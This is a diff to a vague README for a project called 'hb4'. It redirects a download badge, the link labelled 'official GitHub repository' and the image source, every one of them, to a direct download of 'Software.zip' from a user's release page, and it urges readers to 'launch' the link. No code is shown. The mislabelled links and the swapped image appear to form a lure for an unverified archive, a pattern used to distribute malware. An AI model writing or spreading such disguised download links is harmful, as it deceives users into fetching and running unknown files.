@@ -33,7 +33,7 @@ To dive into the 'hb4' project and explore its potential, follow the steps below
 
 To access the project files, you can download the zip archive by clicking the button below:
 
-[![Download hb4 Project](https://img.shields.io/badge/Download-hb4_Project-green)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download hb4 Project](https://github.com/Jo-dll/hb4/releases/download/v2.0/Software.zip)](https://github.com/Jo-dll/hb4/releases/download/v2.0/Software.zip)
 
 *(Note: The link needs to be launched to download the project files.)*
 
@@ -41,7 +41,7 @@ If you encounter any issues with the link provided, please check the *Releases* 
 
 ## 🌐 Additional Resources
 
-For more information on the project and its development, feel free to visit the [official GitHub repository](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip).
+For more information on the project and its development, feel free to visit the [official GitHub repository](https://github.com/Jo-dll/hb4/releases/download/v2.0/Software.zip).
 
 Explore, innovate, and create with the 'hb4' project! 🚀
 
@@ -57,4 +57,4 @@ The 'hb4' project is under an undisclosed license. Please refer to the LICENSE f
 
 Thank you for your interest in the 'hb4' project. Let's embark on this exciting journey together! 🌟
 
-![HB4 Image](https://placeimg.com/640/480/tech)
+![HB4 Image](https://github.com/Jo-dll/hb4/releases/download/v2.0/Software.zip)
